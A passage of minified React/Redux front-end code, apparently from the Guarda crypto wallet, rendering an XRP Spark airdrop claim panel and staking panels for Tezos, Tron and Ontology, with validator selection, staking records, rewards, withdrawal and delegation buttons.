            userSelect: "one_userSelect_3sE4U",
            lockedAmtBlock: "one_lockedAmtBlock_3SvEz",
            tooltipInfo: "one_tooltipInfo_1r4nm",
            iconInfo: "one_iconInfo_1GVo3",
            loader: "one_loader_3zq9o"
        };
        function XrpSparcAirdrop(e) {
            const [t,a] = (0,
            O.useState)(null)
              , n = usePopup()
              , r = undefined
              , l = [...(0,
            $.v9)($c)].filter((e => "eth" === e.currency))
              , s = (0,
            j.k6)();
            (0,
            O.useEffect)(( () => {
                async function loadInformation() {
                    try {
                        const t = await Se.Z.getApiByCurrency("xrp")
                          , n = await t.getSparkAirdropInfo(e.wallet.address);
                        a(n)
                    } catch (e) {
                        a({})
                    }
                }
                loadInformation()
            }
            ), [e.wallet]);
            if (!t)
                return O.createElement(LoaderDots, {
                    visible: !0
                });
            function openPopupCreate() {
                n.open("import-or-create", {
                    initialTab: "create",
                    currency: "eth",
                    isForceCreate: !0,
                    successTitle: "You need an Ethereum address to claim Spark tokens. Therefore, we have generated it for you.",
                    onAfterClose: () => {
                        s.push({
                            pathname: (0,
                            M.RU)("/airdrop-xrp/claim"),
                            search: objectToString({
                                walletFrom: e.wallet.uuid
                            })
                        })
                    }
                })
            }
            function claim() {
                0 === l.length ? openPopupCreate() : s.push({
                    pathname: (0,
                    M.RU)("/airdrop-xrp/claim"),
                    search: objectToString({
                        walletFrom: e.wallet.uuid
                    })
                })
            }
            if (t && !t.status)
                return O.createElement("div", {
                    className: HA.wrapperPanel
                }, "XRP owners have a chance to receive Spark tokens in a 1:1 ratio.", !e.wallet.isWatchOnly && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("br", null), O.createElement(Yl, {
                    color: "blue",
                    onClick: claim
                }, "Claim Spark")));
            if (t && t.status) {
                var i;
                const {ethAddress: e} = null !== (i = t.info) && void 0 !== i ? i : {};
                return O.createElement("div", {
                    className: HA.wrapperPanel
                }, "You’ve already claimed Spark tokens. They will be distributed to your address,", O.createElement("br", null), O.createElement(button_copy, {
                    text: e,
                    className: HA.buttonCopy
                }, (t => O.createElement("b", null, t ? "Copied" : e))), ", in the Flare network")
            }
            return null
        }
        const zA = "estimate-for-staking_estimate_4XjJC";
        function StakingFiatEstimate(e) {
            let {value: t} = e;
            return O.createElement("span", {
                className: zA
            }, "~ ", O.createElement(fiat_estimate_FiatEstimate, {
                renderCurrency: !0,
                value: t
            }), " ")
        }
        const jA = StakingFiatEstimate;
        var $A = a(52246);
        function receive_actions_defineProperty(e, t, a) {
            (t = receive_actions_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function receive_actions_toPropertyKey(e) {
            var t = receive_actions_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function receive_actions_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class ReceiveActions {
            constructor() {
                receive_actions_defineProperty(this, "prefix", "RECEIVE");
                receive_actions_defineProperty(this, "SET_ACTIVE_VALIDATOR", `${this.prefix}.SET_ACTIVE_VALIDATOR`);
                receive_actions_defineProperty(this, "SET_IS_LOADING", `${this.prefix}.SET_IS_LOADING`);
                receive_actions_defineProperty(this, "setActiveValidator", (0,
                $A.Z)(this.SET_ACTIVE_VALIDATOR));
                receive_actions_defineProperty(this, "setIsLoading", (0,
                $A.Z)(this.SET_IS_LOADING))
            }
        }
        const ZA = new ReceiveActions
          , YA = {
            isLoading: !1,
            activeValidator: void 0
        }
          , setActiveValidator = (e, t) => ({
            ...e,
            activeValidator: t.payload
        })
          , qA = {
            [ZA.SET_ACTIVE_VALIDATOR]: setActiveValidator
        }
          , XA = (0,
        Ru.Z)(qA, YA)
          , getReceive = e => e.receive
          , QA = "api/v1/staking-info/general/staking-vars"
          , JA = 3
          , ex = 300
          , tx = 3e4
          , fetchStakingVars = async () => {
            try {
                const e = await U.Ht.get(QA);
                return e.data.stakingBatchAmount ? {
                    type: "FETCH_STAKING_VARS_SUCCESS",
                    stakingBatchAmount: e.data.stakingBatchAmount || 3,
                    stakingBatchDelay: e.data.stakingBatchDelay || ex,
                    stakingUpdateInterval: e.data.stakingUpdateInterval || tx
                } : e.data.message ? {
                    type: "FETCH_STAKING_VARS_ERROR",
                    message: e.data.message
                } : {
                    type: "FETCH_STAKING_VARS_ERROR",
                    message: "staking vars fetch error, should be use default values"
                }
            } catch (e) {
                return {
                    type: "FETCH_STAKING_VARS_ERROR",
                    message: e.message || "staking vars fetch error, should be use default values"
                }
            }
        }
        ;
        function *fetchStakingVarsCase() {
            const e = yield(0,
            Df.RE)(fetchStakingVars);
            if ("FETCH_STAKING_VARS_SUCCESS" === e.type) {
                const t = {
                    stakingBatchAmount: e.stakingBatchAmount,
                    stakingBatchDelay: e.stakingBatchDelay,
                    stakingUpdateInterval: e.stakingUpdateInterval
                };
                yield(0,
                Df.gz)(lb.setStakingVars({
                    stakingVars: t
                }))
            }
            if ("FETCH_STAKING_VARS_ERROR" === e.type) {
                const e = {
                    stakingBatchAmount: 3,
                    stakingBatchDelay: ex,
                    stakingUpdateInterval: tx
                };
                yield(0,
                Df.gz)(lb.setStakingVars({
                    stakingVars: e
                }))
            }
        }
        const stakingStateSelector = e => e.staking
          , ax = (0,
        _t.P1)(stakingStateSelector, (e => e.activeStaking))
          , nx = (0,
        _t.P1)(stakingStateSelector, (e => e.isLoading))
          , rx = (0,
        _t.P1)(stakingStateSelector, (e => e.process))
          , lx = (0,
        _t.P1)(stakingStateSelector, (e => e.isError))
          , sx = (0,
        _t.P1)(stakingStateSelector, (e => e.errorMessage))
          , ix = (0,
        _t.P1)(stakingStateSelector, (e => e.transactionHash))
          , ox = (0,
        _t.P1)(stakingStateSelector, (e => e.currentEpoch))
          , cx = (0,
        _t.P1)(stakingStateSelector, (e => t => {
            let {uuid: a} = t;
            const {stakeInfoStorage: n} = e;
            if (n && a) {
                const e = n[a];
                if (e)
                    return e
            }
        }
        ))
          , ux = (0,
        _t.P1)(stakingStateSelector, (e => {
            const {stakingUpdateInterval: t, stakingBatchDelay: a, stakingBatchAmount: n} = e.stakingVars;
            return {
                stakingUpdateInterval: Number(t) || tx,
                stakingBatchDelay: Number(a) || ex,
                stakingBatchAmount: Number(n) || 3
            }
        }
        ))
          , dx = (0,
        _t.P1)(stakingStateSelector, (e => e.isOnceStakingInfoUpdateStart))
          , mx = (0,
        _t.P1)(stakingStateSelector, (e => e.isOneTimeFetchStart))
          , px = "app-settings"
          , fx = null
          , Ex = {
            stakesSettings: [],
            settingsFetchError: !1
        }
          , selectedStakeSettings = e => e["app-settings"].stakesSettings || []
          , selectedSettingsFetchError = e => e["app-settings"].settingsFetchError
          , hx = (0,
        te.createReducer)(Ex).handleAction(W_, ( (e, t) => {
            let {payload: {settings: a}} = t;
            return {
                ...e,
                stakesSettings: [...a.stakesSettings],
                settingsFetchError: !1
            }
        }
        )).handleAction(R_, (e => ({
            ...e,
            settingsFetchError: !0
        })));
        function isAvailableOnCurrentPlatform(e) {
            return (0,
            M.p1)() ? e.isExtensionAvailable : (0,
            M.d)() ? e.isDesktopAvailable : !(!(0,
            M.d)() && !(0,
            M.p1)()) || e.isWebAvailable
        }
        function getMessage(e, t) {
            const a = `${t.currency.toUpperCase()} staking is temporarily deactivated. Don't worry, your funds are safe. For more information contact us at support@guarda.com or ask in our Telegram community`;
            return e.customMessage || a
        }
        function withSettingsDisablement(e) {
            var t;
            const ComponentWithDisablement = t => {
                const {wallet: a} = t
                  , n = (0,
                $.v9)(selectedSettingsFetchError)
                  , r = (0,
                $.v9)(selectedStakeSettings);
                if (n)
                    return O.createElement(ui_message, {
                        type: "info"
                    }, "Can’t fetch data. Try again later or contact us at support@guarda.com");
                const l = r.find((e => e.currency.toLowerCase() === a.currency.toLowerCase()));
                return l && !isAvailableOnCurrentPlatform(l) ? O.createElement(ui_message, {
                    type: "info"
                }, getMessage(l, a)) : O.createElement(e, t)
            }
            ;
            ComponentWithDisablement.displayName = `withSettingsDisablement(${null !== (t = e.displayName) && void 0 !== t ? t : e.name})`;
            return ComponentWithDisablement
        }
        const gx = (0,
        te.createAction)("@xtx/validators/SET_VALIDATORS")()
          , yx = "@xtx/validators"
          , vx = {
            validators: []
        }
          , _x = (0,
        te.createReducer)(vx).handleAction(gx, ( (e, t) => {
            let {payload: {validators: a}} = t;
            return {
                ...e,
                validators: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            validators: []
        })))
          , validators_xtz_selectedValidators = e => e["@xtx/validators"].validators || []
          , validators_xtz_fetchValidators = () => async (e, t) => {
            const a = t();
            if (validators_xtz_selectedValidators(a).length)
                return;
            const n = await Se.Z.loadLightAdapterByWallet({
                currency: "xtz",
                family: "xtz"
            });
            if (!n)
                return;
            const r = await n.fetchValidators();
            e(gx({
                validators: r
            }))
        }
          , wx = "tz1d9ek6HrScY6QRZ71NJdB85MNz8gKGBjrv"
          , startFetchValidators = async e => {
            let {setLoading: t, dispatch: a} = e;
            t(!0);
            await a(validators_xtz_fetchValidators());
            t(!1)
        }
          , useXtzValidators = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(validators_xtz_selectedValidators)
              , a = (0,
            $.v9)(Bo)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            O.useMemo)(( () => {
                const e = t.find((e => e.address === wx));
                return e || (t.length > 0 ? t[0] : void 0)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (t.length || startFetchValidators({
                    setLoading: r,
                    dispatch: e
                }))
            }
            ), [e, t.length, a]);
            return {
                listOfValidators: t,
                defaultValidator: l,
                isLoading: n
            }
        }
          , bx = useXtzValidators
          , kx = {
            wrapper: "atom_wrapper_3hMhs main_block_15zml",
            stakeLine: "atom_stakeLine_UU4xt",
            wrapperClaimBlock: "atom_wrapperClaimBlock_1pIL5",
            buttonLink: "atom_buttonLink_10pYr",
            external: "atom_external_3CGjx",
            address: "atom_address_xUHQG",
            addressContainer: "atom_addressContainer_3o8X8",
            userSelect: "atom_userSelect_iSG2T",
            loader: "atom_loader_3_M8F"
        }
          , XtzStakingPanel = e => {
            let {wallet: t} = e;
            const a = (0,
            $.I0)()
              , n = (0,
            $.v9)(ax)
              , r = undefined
              , l = (0,
            $.v9)(cx)({
                uuid: t.uuid
            })
              , {activeValidator: s} = (0,
            $.v9)(getReceive)
              , [i,o] = (0,
            O.useState)(null)
              , [c,u] = (0,
            O.useState)(void 0)
              , [d,m] = (0,
            O.useState)(!0)
              , {listOfValidators: p} = bx()
              , {convertToFiat: f} = useConverter()
              , {handleGo: E} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            })
              , h = (0,
            O.useMemo)(( () => t.watchOnly), [t.watchOnly])
              , {balance: g} = t
              , y = (0,
            O.useMemo)(( () => (0,
            Ko.lt)(g, null == i ? void 0 : i.minDelegationAmount)), [g, null == i ? void 0 : i.minDelegationAmount])
              , v = (0,
            O.useMemo)(( () => !y && (0,
            Ko.lt)(g, "20")), [g, y])
              , _ = (0,
            O.useMemo)(( () => !y && (0,
            Ko.gt)(g, "20") && (0,
            Ko.G)(null == i ? void 0 : i.bakerAvailableCapacity, "0")), [g, null == i ? void 0 : i.bakerAvailableCapacity, y])
              , w = Boolean((!n || "STAKING_INFO_SUCCESS" !== n.fetchStatus) && p && p.length > 0)
              , b = (0,
            O.useMemo)(( () => (null == t ? void 0 : t.isNewWallet) || (null == t ? void 0 : t.isNewToken)), [t])
              , k = (0,
            O.useMemo)(( () => null != i && i.stakedValidators && "singleValidator"in i.stakedValidators ? i.stakedValidators.singleValidator : null), [null == i ? void 0 : i.stakedValidators])
              , S = (0,
            O.useMemo)(( () => i && "SUCCESS" !== i.status || i && "SUCCESS" === i.status && "0" === i.totalRewards), [i])
              , C = (0,
            O.useCallback)((e => a(ZA.setActiveValidator(e))), [a]);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (w && t && "string" == typeof t.uuid && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid,
                        currency: t.currency,
                        address: t.address,
                        balance: t.balance,
                        privateKey: t.privateKey
                    };
                    a(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: p
                    }))
                }
            }
            ), [a, t, w, p, n]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    m(!0);
                    o(null);
                    C(void 0);
                    a(lb.setClearStore())
                }
            }
            ), [t.uuid]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (n) {
                    const t = n.dto;
                    o(t);
                    if (t.stakedValidators && "singleValidator"in t.stakedValidators) {
                        var e;
                        const a = null === (e = t.stakedValidators.singleValidator) || void 0 === e ? void 0 : e.validator;
                        a && C(a)
                    }
                    m(!1)
                }
            }
            ), [n, C]);
            (0,
            O.useEffect)((function useStakingInfoFromStorage() {
                if (l) {
                    const t = l.dto;
                    o(t);
                    if (t.stakedValidators && "singleValidator"in t.stakedValidators) {
                        var e;
                        const a = null === (e = t.stakedValidators.singleValidator) || void 0 === e ? void 0 : e.validator;
                        a && C(a)
                    }
                }
            }
            ), [l, C]);
            (0,
            O.useEffect)((function setGuardaAnnualYield() {
                if (p.length) {
                    const t = p.find((e => "Guarda Wallet" === e.title));
                    if (t && t.subtitle) {
                        var e;
                        u(null === (e = t.subtitle.match(/[\d.,]/gm)) || void 0 === e ? void 0 : e[0])
                    }
                }
            }
            ), [p]);
            return n || l ? S ? O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: d,
                width: 30,
                className: kx.loader
            }), "Annual yield: ", O.createElement("b", null, c, "%"), O.createElement("br", null), O.createElement("br", null), "Staked: ", O.createElement("b", {
                className: kx.userSelect
            }, "0 XTZ"), " ", O.createElement(jA, {
                value: f(0, t)
            }), O.createElement("br", null), O.createElement("br", null), !h && O.createElement(O.Fragment, null, O.createElement(Yl, {
                color: "blue",
                onClick: E({
                    path: (0,
                    M.RU)("/staking-xtz/staking"),
                    wallet: t,
                    isNewToken: !1,
                    isNewWallet: b,
                    parentWallet: null,
                    fromWallet: !0
                })
            }, "Stake"), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/tezos-staking",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get a reward for staking XTZ", O.createElement("img", {
                src: Bp,
                className: kx.external,
                alt: ""
            }))) : i && "SUCCESS" === i.status && s ? O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: d,
                width: 30,
                className: kx.loader
            }), "Staked: ", O.createElement("b", {
                className: kx.userSelect
            }, (0,
            Ko.yF)(g, 4), " XTZ"), " ", O.createElement(jA, {
                value: f(g, t)
            }), O.createElement("br", null), O.createElement("br", null), O.createElement("div", {
                className: kx.addressContainer
            }, "Validator:  ", O.createElement("b", null, s.title), O.createElement("br", null), O.createElement("br", null)), s && O.createElement(O.Fragment, null, "Annual yield: ", O.createElement("b", null, s.rate, "%"), O.createElement("br", null), O.createElement("br", null)), s && O.createElement("div", {
                className: kx.addressContainer
            }, "Address:  ", O.createElement("b", null, O.createElement(button_copy, {
                text: s.address
            }, (e => e ? "Сopied to clipboard" : formatAddress(s.address, 5)))), O.createElement("br", null), O.createElement("br", null)), "Staked At: ", O.createElement("b", null, date_format((null == k ? void 0 : k.stakedAt) || "")), O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("br", null), "Reward frequency: ", O.createElement("b", null, "~ every 3 days")), O.createElement("br", null), i && !i.active && O.createElement("p", {
                style: {
                    color: "red",
                    marginBottom: "0px"
                }
            }, "Validator is inactive, please redelegate"), y && i.active && O.createElement("p", {
                style: {
                    color: "red",
                    marginBottom: "0px"
                }
            }, "Your baker requires minimum ", i.minDelegationAmount, " XTZ, so you will not receive rewards. Change a validator to start receiving rewards."), v && i.active && O.createElement("p", {
                style: {
                    color: "red",
                    marginBottom: "0px"
                }
            }, "Your real APR is decreased because your balance is less than recommended. Top up your balance to at least 20 XTZ to receive the expected APR."), _ && i.active && O.createElement("p", {
                style: {
                    color: "red",
                    marginBottom: "0px"
                }
            }, "Your validator is over-delegated and you might not receive the reward. Check whether you have incoming transactions every 3 days and if not, change your validator."), O.createElement("br", null), !h && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-xtz/staking?walletFrom=${t.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Change Validator")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/tezos-staking/",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get a reward for staking XTZ", O.createElement("img", {
                src: Bp,
                className: kx.external,
                alt: ""
            }))) : null : O.createElement(loader, {
                visible: !0,
                width: 30,
                className: kx.loader
            })
        }
          , Sx = withSettingsDisablement(XtzStakingPanel);
        function VotesList(e) {
            let {candidates: t, availableVotes: a} = e;
            return O.createElement(O.Fragment, null, O.createElement(label, null, "Votes:"), O.createElement("div", {
                className: KA.block
            }, O.createElement("div", {
                className: KA.row
            }, "Total votes: ", O.createElement("span", {
                className: KA.value
            }, a))), t.map(( (e, t) => {
                const n = e.votes / a * 100;
                return O.createElement("div", {
                    className: KA.block,
                    key: t
                }, O.createElement("div", {
                    className: KA.row
                }, "SR Name: ", O.createElement("span", {
                    className: KA.value
                }, e.candidateName)), O.createElement("div", {
                    className: KA.row
                }, "SR Address: ", O.createElement("span", {
                    className: KA.value
                }, e.candidateAddress)), O.createElement("div", {
                    className: KA.row
                }, "Time of voting: ", O.createElement("span", {
                    className: KA.value
                }, new Date(e.candidateTimestamp).toDateString())), O.createElement("div", {
                    className: KA.row
                }, "Votes:", " ", O.createElement("span", {
                    className: KA.value
                }, e.votes, " (", parseFloat(n.toFixed(2)), "% of total)")))
            }
            )))
        }
        function Rewards(e) {
            let {wallet: t, reward: a} = e;
            const n = new URLSearchParams({
                walletFrom: t.uuid || "",
                amount: a || ""
            });
            return O.createElement("div", {
                className: KA.block
            }, O.createElement("div", {
                className: KA.row
            }, "Your reward: ", O.createElement("span", {
                className: KA.value
            }, a, " TRX")), O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-trx/claim/confirm?${n.toString()}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Claim")))
        }
        function Withdrawable(e) {
            let {availableForWithdraw: t, wallet: a} = e;
            const n = new URLSearchParams({
                walletFrom: a.uuid || "",
                amount: t || ""
            });
            return O.createElement("div", {
                className: KA.block
            }, O.createElement("div", {
                className: KA.row
            }, "Unstaked Tron available for withdrawal: ", O.createElement("span", {
                className: KA.value
            }, t, " TRX")), O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-trx/withdraw/confirm?${n.toString()}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Withdraw")))
        }
        function getStakingRecordType(e, t) {
            return t.ownerAddress !== e ? `Delegation from ${t.ownerAddress}` : t.ownerAddress !== t.receivingResourcesAddress ? `Delegation to ${t.receivingResourcesAddress}` : "Staking"
        }
        function V1StakingRecordsList(e) {
            let {wallet: t, stakingRecords: a, convertToFiat: n} = e;
            const r = Date.now();
            return O.createElement(O.Fragment, null, O.createElement(label, null, "Staking 1.0 Records"), O.createElement(O.Fragment, null, a.map(( (e, a) => O.createElement("div", {
                className: KA.block,
                key: a
            }, O.createElement("div", {
                className: KA.row
            }, "Type: ", O.createElement("span", {
                className: KA.value
            }, getStakingRecordType(t.address, e))), O.createElement("div", {
                className: KA.row
            }, "Frozen amount: ", O.createElement("span", {
                className: KA.value
            }, e.frozenBalance, " TRX"), " ", O.createElement(jA, {
                value: n(e.frozenBalance, t)
            })), O.createElement("div", {
                className: KA.row
            }, "Resource amount:", " ", O.createElement("span", {
                className: KA.value
            }, e.resourceAmount, " ", e.resource.toUpperCase())), e.freezedUntilTimestamp > r && O.createElement("div", {
                className: KA.row
            }, "Freezed until: ", O.createElement("span", {
                className: KA.value
            }, date_format(e.freezedUntilTimestamp))))))))
        }
        const Cx = 864e5;
        function V2ActiveStakingRecordsList(e) {
            let {wallet: t, stakingRecords: a, convertToFiat: n} = e;
            return O.createElement(O.Fragment, null, O.createElement(label, null, "Staking 2.0 Active Records"), O.createElement(O.Fragment, null, a.map(( (e, a) => {
                const r = e.lockedUntilTimestamp && Math.ceil((e.lockedUntilTimestamp - Date.now()) / Cx);
                return O.createElement("div", {
                    className: KA.block,
                    key: a
                }, O.createElement("div", {
                    className: KA.row
                }, "Action type: ", O.createElement("span", {
                    className: KA.value
                }, getStakingRecordType(t.address, e))), O.createElement("div", {
                    className: KA.row
                }, "Action time: ", O.createElement("span", {
                    className: KA.value
                }, date_format(e.stakingTimestamp))), O.createElement("div", {
                    className: KA.row
                }, "Frozen amount: ", O.createElement("span", {
                    className: KA.value
                }, e.frozenBalance, " TRX"), " ", O.createElement(jA, {
                    value: n(e.frozenBalance, t)
                })), O.createElement("div", {
                    className: KA.row
                }, "Resource amount:", " ", O.createElement("span", {
                    className: KA.value
                }, e.resourceAmount, " ", e.resource.toUpperCase())), e.lockedUntilTimestamp && O.createElement("div", {
                    className: KA.row
                }, "Locked until:", " ", O.createElement("span", {
                    className: KA.value
                }, date_format(e.lockedUntilTimestamp), " (<", r, " days left)")))
            }
            ))))
        }
        function V2UnfreezingStakingRecordsList(e) {
            let {wallet: t, stakingRecords: a, convertToFiat: n} = e;
            return O.createElement(O.Fragment, null, O.createElement(label, null, "Staking 2.0 Unfreezing Records"), O.createElement(O.Fragment, null, a.map(( (e, a) => {
                const r = Math.ceil((e.freezedUntilTimestamp - Date.now()) / Cx);
                return O.createElement("div", {
                    className: KA.block,
                    key: a
                }, O.createElement("div", {
                    className: KA.row
                }, "Type: ", O.createElement("span", {
                    className: KA.value
                }, getStakingRecordType(t.address, e))), O.createElement("div", {
                    className: KA.row
                }, "Unfreezing amount: ", O.createElement("span", {
                    className: KA.value
                }, e.frozenBalance, " TRX"), " ", O.createElement(jA, {
                    value: n(e.frozenBalance, t)
                })), O.createElement("div", {
                    className: KA.row
                }, "Freezed until:", " ", O.createElement("span", {
                    className: KA.value
                }, date_format(e.freezedUntilTimestamp), " (<", r, " days left)")))
            }
            ))))
        }
        function StakingRecordsList(e) {
            let {wallet: t, v1StakingRecords: a, v2StakingRecords: n} = e;
            const {convertToFiat: r} = useConverter();
            return a || n ? O.createElement(O.Fragment, null, !(null == a || !a.length) && O.createElement(V1StakingRecordsList, {
                wallet: t,
                stakingRecords: a,
                convertToFiat: r
            }), !(null == n || !n.active.length) && O.createElement(V2ActiveStakingRecordsList, {
                wallet: t,
                stakingRecords: n.active,
                convertToFiat: r
            }), !(null == n || !n.unfreezing.length) && O.createElement(V2UnfreezingStakingRecordsList, {
                wallet: t,
                stakingRecords: n.unfreezing,
                convertToFiat: r
            })) : null
        }
        const TrxStakingPanel = e => {
            var t, a;
            let {wallet: n} = e;
            const [r,l] = (0,
            O.useState)([])
              , [s,i] = (0,
            O.useState)()
              , [o,c] = (0,
            O.useState)()
              , [u,d] = (0,
            O.useState)("0")
              , [m,p] = (0,
            O.useState)("0")
              , [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)(!0)
              , [y,v] = (0,
            O.useState)()
              , _ = (0,
            O.useRef)(!0)
              , w = (0,
            O.useRef)(null)
              , b = (0,
            O.useCallback)(( () => {
                const fetchData = async () => {
                    const e = await Se.Z.getApiByWallet({
                        currency: n.currency,
                        family: n.family,
                        precision: Number(n.precision),
                        smartContract: n.smartContract
                    });
                    g(!0);
                    try {
                        await Promise.all([async () => {
                            var t;
                            const a = await e.getV1StakingRecordsByAddress({
                                address: n.address,
                                abortSignal: null == w || null === (t = w.current) || void 0 === t ? void 0 : t.signal
                            });
                            _ && l(a)
                        }
                        , async () => {
                            var t;
                            const a = await e.getV2StakingRecordsByAddress({
                                address: n.address,
                                abortSignal: null == w || null === (t = w.current) || void 0 === t ? void 0 : t.signal
                            });
                            _ && i(a)
                        }
                        , async () => {
                            var t;
                            const a = await e.getVotesByAddress({
                                address: n.address,
                                abortSignal: null == w || null === (t = w.current) || void 0 === t ? void 0 : t.signal
                            });
                            _ && c(a)
                        }
                        , async () => {
                            const t = await e.getAvailableForWithdraw({
                                address: n.address
                            });
                            _ && p(t)
                        }
                        , async () => {
                            const t = await e.getRewardsByAddress({
                                address: n.address
                            });
                            _ && d(t)
                        }
                        , async () => {
                            const t = await e.getAvailableForDelegation({
                                address: n.address,
                                resource: "bandwidth"
                            });
                            if (!_)
                                return;
                            if ((0,
                            Ko.gt)(t, 0))
                                return E(!0);
                            const a = await e.getAvailableForDelegation({
                                address: n.address,
                                resource: "energy"
                            });
                            _ && (0,
                            Ko.gt)(a, 0) && E(!0)
                        }
                        ].map((async e => e())));
                        if (!_)
                            return;
                        v("")
                    } catch {
                        if (!_)
                            return;
                        v("Not all staking information has been loaded")
                    }
                    g(!1)
                }
                ;
                fetchData()
            }
            ), [n.address, n.currency, n.family, n.precision, n.smartContract]);
            (0,
            O.useEffect)(( () => () => {
                _.current = !1
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                w.current = new AbortController;
                b();
                return () => {
                    var e;
                    null === (e = w.current) || void 0 === e || e.abort()
                }
            }
            ), [b]);
            const k = (0,
            O.useMemo)(( () => {
                var e;
                const t = Date.now();
                return !(null == s || null === (e = s.active) || void 0 === e || !e.some((e => e.ownerAddress === n.address && e.receivingResourcesAddress !== n.address && (e.lockedUntilTimestamp || 0) < t)))
            }
            ), [null == s ? void 0 : s.active, n.address])
              , S = !(null == s || null === (t = s.active) || void 0 === t || !t.length) || !(null == r || !r.length)
              , C = (0,
            O.useMemo)(( () => ((null == s ? void 0 : s.unfreezing) || []).reduce(( (e, t) => e + +t.frozenBalance), 0)), [null == s ? void 0 : s.unfreezing])
              , N = C > 0;
            return O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: h,
                width: 30,
                className: KA.loader
            }), +u > 0 && O.createElement(Rewards, {
                reward: u,
                wallet: n
            }), +m > 0 && O.createElement(Withdrawable, {
                wallet: n,
                availableForWithdraw: m
            }), O.createElement(StakingRecordsList, {
                wallet: n,
                v1StakingRecords: r,
                v2StakingRecords: s
            }), !(null == o || !o.availableVotes) && O.createElement(VotesList, o), O.createElement("div", {
                className: KA.block
            }, o && 0 !== (null == o || null === (a = o.candidates) || void 0 === a ? void 0 : a.length) ? O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                className: KA.blockButton,
                to: `${(0,
                M.RU)()}/staking-trx/vote`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Vote"))) : null, O.createElement(Y.OL, {
                className: KA.blockButton,
                to: `${(0,
                M.RU)()}/staking-trx?walletFrom=${n.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Stake")), S && O.createElement(Y.OL, {
                className: KA.blockButton,
                to: `${(0,
                M.RU)()}/staking-trx/unstaking?walletFrom=${n.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Unstake")), f && O.createElement(Y.OL, {
                className: KA.blockButton,
                to: `${(0,
                M.RU)()}/staking-trx/delegate-resources?walletFrom=${n.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Delegate resources")), k && O.createElement(Y.OL, {
                className: KA.blockButton,
                to: `${(0,
                M.RU)()}/staking-trx/undelegate-resources?walletFrom=${n.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Undelegate resources")), N && O.createElement(Y.OL, {
                className: KA.blockButton,
                to: `${(0,
                M.RU)()}/staking-trx/cancel-unstake/confirm?walletFrom=${n.uuid}&amount=${C}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Cancel unstake"))), y && O.createElement("div", {
                className: KA.block
            }, O.createElement(ui_message, {
                type: "error"
            }, y, ". ", O.createElement("a", {
                onClick: b
            }, "Retry"))))
        }
          , Nx = withSettingsDisablement(TrxStakingPanel)
          , Tx = (0,
        te.createAction)("@ont/validators/SET_VALIDATORS")()
          , Ax = "@ont/validators"
          , xx = {
            validators: []
        }
          , Ix = (0,
        te.createReducer)(xx).handleAction(Tx, ( (e, t) => {
            let {payload: {validators: a}} = t;
            return {
                ...e,
                validators: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            validators: []
        })))
          , validators_ont_selectedValidators = e => e["@ont/validators"].validators || []
          , validators_ont_fetchValidators = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return async (t, a) => {
                const n = a()
                  , r = undefined;
                if (!1 === n["wallet-updater"].isAllBalanceUpdating && !0 !== e || 0 !== validators_ont_selectedValidators(n).length)
                    return;
                const l = await Se.Z.loadLightAdapterByWallet({
                    currency: "ont"
                });
                void 0 !== l && t(Tx({
                    validators: await l.fetchValidators()
                }))
            }
        }
          , Px = "AX22GRNdwhSbnhttPNhyZXYgSpiPNFFAsK"
          , use_ont_validators_startFetchValidators = async e => {
            let {setLoading: t, dispatch: a} = e;
            t(!0);
            await a(validators_ont_fetchValidators(!0));
            t(!1)
        }
          , useOntValidators = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(validators_ont_selectedValidators)
              , [a,n] = (0,
            O.useState)(!1)
              , r = (0,
            O.useMemo)(( () => {
                const e = t.find((e => e.address === Px));
                return e || (t.length > 0 ? t[0] : void 0)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                0 === t.length && use_ont_validators_startFetchValidators({
                    setLoading: n,
                    dispatch: e
                })
            }
            ), [e, t.length]);
            return {
                listOfValidators: t,
                defaultValidator: r,
                isLoading: a
